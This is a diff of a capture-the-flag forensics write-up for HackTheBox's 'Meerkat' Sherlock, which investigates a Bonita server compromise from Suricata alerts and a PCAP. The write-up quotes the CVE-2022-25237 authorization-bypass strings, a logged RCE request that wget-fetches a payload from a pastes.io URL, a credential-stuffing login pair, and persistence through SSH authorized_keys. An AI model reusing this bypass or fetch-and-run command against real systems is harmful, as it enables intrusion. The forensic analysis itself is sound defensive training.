@@ -30,7 +30,7 @@ After unzipping the provided file, we obtain these two artifacts:
 
 The `meerkat-alerts.json` is a JSON log data file that has been exported and contains important information to detect potential signs of intrusion.
 
-Because of the name of the Sherlock, we could assume that the log file is from [Suricata](https://suricata.io/), a network Intrusion Detection System, Intrusion Prevention System and Network Security Monitoring engine developed by the OISF and the Suricata community.
+Because of the name of the Sherlock, we could assume that the log file is from [Suricata](https://suricata.io/), a network Intrusion Detection System (IDS), Intrusion Prevention System (IPS), and Network Security Monitoring (NSM) engine developed by the OISF and the Suricata community.
 
 ![meerkat-alerts](logexample.png)
 
@@ -48,7 +48,7 @@ A PCAP file captures individual packets and stores details like:
 * Timestamps
 
 These files can be generated and viewed by packet capture tools such as
-[Wireshark](https://www.wireshark.org/), and [tcpdump](https://www.tcpdump.org/), and can be used to do a lot of things, such as:
+[Wireshark](https://www.wireshark.org/) and [tcpdump](https://www.tcpdump.org/), and can be used to do a lot of things, such as:
 
 * **Network Troubleshooting:** We can diagnose network issues, such as identifying causes of packet loss or failed connections.
 * **Security Forensics and Incident Response (IR):** We can use it to investigate security incidents retroactively, to determine the scope of the breach, and understand how an attacker gained access to the network.
@@ -60,7 +60,7 @@ These files can be generated and viewed by packet capture tools such as
 
 ### Task 1: We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?
 
-To answer this question, we can use the log file to see an alert indicating if a server has been compromised. We can use the `jq` tool to parse the log file and filter for the alert signatures
+To answer this question, we can use the log file to see an alert indicating whether a server has been compromised. We can use the `jq` tool to parse the log file and filter for the alert signatures.
 
 ```bash
 jq '.[] | .alert.signature' meerkat-alerts.json
@@ -80,7 +80,7 @@ Using the results of the previous task, we can search for the CVE related to the
 
 In the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2022-25237), we can see a brief description of the vulnerability:
 
-> "Bonita Web 2021.2 is affected by a authentication/authorization bypass vulnerability due to an overly broad exclude pattern used in the RestAPIAuthorizationFilter. By appending ;`i18ntranslation` or `/../i18ntranslation/` to the end of a URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions."
+> "Bonita Web 2021.2 is affected by a authentication/authorization bypass vulnerability due to an overly broad exclude pattern used in the RestAPIAuthorizationFilter. By appending `;i18ntranslation` or `/../i18ntranslation/` to the end of a URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions."
 
 In the References, if we click on the [Rhino Security Labs](https://rhinosecuritylabs.com/application-security/cve-2022-25237-bonitasoft-authorization-bypass/) reference for the CVE, we can see that:
 
@@ -97,17 +97,17 @@ In the page we can see these four sub-techniques:
 * **Password Spraying:** Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.
 * **Credential Stuffing:** Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap.
 
-Now, using the `meerkat.pcap`, we can determine how the attacker obtained valid credentials. Using Wireshark, we go to Statistics > HTTP > Requests, we can see that most of the requests to the Forela site are going to the `/bonita/loginservice` page.
+Now, using the `meerkat.pcap`, we can determine how the attacker obtained valid credentials. Using Wireshark, we can go to Statistics > HTTP > Requests and see that most of the requests to the Forela site are going to the `/bonita/loginservice`.
 
 ![HTTP Requests](request.png)
 
-Filtering by this page, we can see all the attacker attempts to get valid credentials
+Filtering by this, we can see all the attacker attempts to get valid credentials.
 
 ![Getting Credentials](getcred.png)
 
 ![User test 1](ust1.png#centered)
 
-Examining each attempt reveals that the attackers use valid usernames paired with uncommon passwords. They do not reuse the same password across multiple usernames, nor do they appear to be guessing or cracking credentials.
+Examining each attempt reveals that the attacker uses valid username and password combinations obtained from a breach dump. Each pair consists of a valid username paired with its corresponding password from the dump. They do not reuse the same password across multiple usernames, as each account has its unique password, nor do they appear to be guessing or cracking credentials.
 
 So, with that, we can assume that the sub-technique of Brute Force used is `Credential Stuffing`.
 
@@ -125,9 +125,9 @@ Using the past two tasks, we can see that the vulnerability exploited has the `C
 
 In Task 2, we searched for the CVE related to the exploitation, and in the CVE page in [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2022-25237), we can see in the brief:
 
-> "Bonita Web 2021.2 is affected by a authentication/authorization bypass vulnerability due to an overly broad exclude pattern used in the RestAPIAuthorizationFilter. By appending ;`i18ntranslation` or `/../i18ntranslation/` to the end of a URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions."
+> "Bonita Web 2021.2 is affected by a authentication/authorization bypass vulnerability due to an overly broad exclude pattern used in the RestAPIAuthorizationFilter. By appending `;i18ntranslation` or `/../i18ntranslation/` to the end of a URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions."
 
-The request traffic includes many URLs containing `i18ntranslation`.
+The HTTP request traffic includes many URLs containing `i18ntranslation`.
 
 ![HTTP Requests](request.png)
 
@@ -137,39 +137,33 @@ So, the string appended to the API URL path is `i18ntranslation`.
 
 ### Task 5: How many combinations of usernames and passwords were used in the credential stuffing attack?
 
-Filtering the PCAP for HTTP requests to `/bonita/loginservice` and reviewing the TCP conversations by Statistics > Conversations > TCP, it shows 59 total credential-related attempts.
+Filtering the PCAP for HTTP requests to `/bonita/loginservice` and reviewing the TCP conversations by Statistics > Conversations > IPV4, we can see the majority of the conversation are from `156.146.62.213`.
 
-![TCP requests](req.png)
+![ipv4 pane](ipv4.png)
 
-By inspecting the conversations and excluding duplicate credential pairs plus the default `install:install` trial, we find 56 unique username/password combinations used in the attack.
+Filtering by this source, we can see we have a lot of packets with the default `install:install` credential trial.
+
+![Filtering by source](bysrc.png)
+
+By removing this trial, we find 56 unique username/password combinations used in the attack.
+
+![Total attempts](total.png)
 
 * **Answer:** `56`.
 
 ### Task 6: Which username and password combination was successful?
 
-In the same way as Task 5, filtering the PCAP by HTTP requests that contain `/bonita/loginservice`, and going to Statistics > Conversations > TCP
+Filtering the packets by the attacker source `156.146.62.213` and by http protocol, we can search if the attacker use the appending string before the use of an credential.
 
-![Getting Credentials](getcred.png)
+![Credential](credential.png)
 
-With this, we see all the 59 TCP conversations for the credential stuffing attack
+As we can see, the attacker sent a request containing the CVE string after using the credentials for `seb.broom@forela.co.uk` (password: `g0vernm3n`). They then executed the whoami command to verify the privileges gained..
 
-![TCP requests](req.png)
-
-We can see in the Total Packets column that we have conversations with just 18 packets and requests with more than 50.
-
-![Packets Column](pktcol.png#center)
-
-We can use the Follow Stream button to inspect the conversation with more packets. That stream shows the successful login response after submitting credentials.
-
-![204 Return](return.png)
-
-This credential is associated with the username `eb.broom@forela.co.uk` and the password `g0vernm3n`.
-
-* **Answer:** `eb.broom@forela.co.uk:g0vernm3n`.
+* **Answer:** `seb.broom@forela.co.uk:g0vernm3n`.
 
 ### Task 7: If any, which text sharing site did the attacker utilise?
 
-In Task 2, we can see that we have a request to the `/bonita/API/extension/rce?p=0&c=1&cmd=wget%20https://pastes.io/raw/bx5gcr0et8`, so we can see that the attacker got a file from `https://pastes.io/raw/bx5gcr0et8` and utilized the `pastes.io` sharing site.
+In Task 2, we can see that we have a request to the `/bonita/API/extension/rce?p=0&c=1&cmd=wget%20https://pastes.io/raw/bx5gcr0et8`, so we can see that the attacker executes a command and got a file from `https://pastes.io/raw/bx5gcr0et8`, utilizing the `pastes.io` sharing site.
 
 ![HTTP Requests](request.png)
 
@@ -203,6 +197,6 @@ In the 'Persistence' tab, we can search for 'Account Manipulation' to see the re
 
 ![MITRE ATT&CK](mitre.png)
 
-With that we can see the sub-technique ID is `T1098.004`.
+Because the attacker modified the SSH authorized_keys file to maintain persistence on a victim host, we can see that the sub-technique ID is `T1098.004`.
 
 * **Answer:**  `T1098.004`.
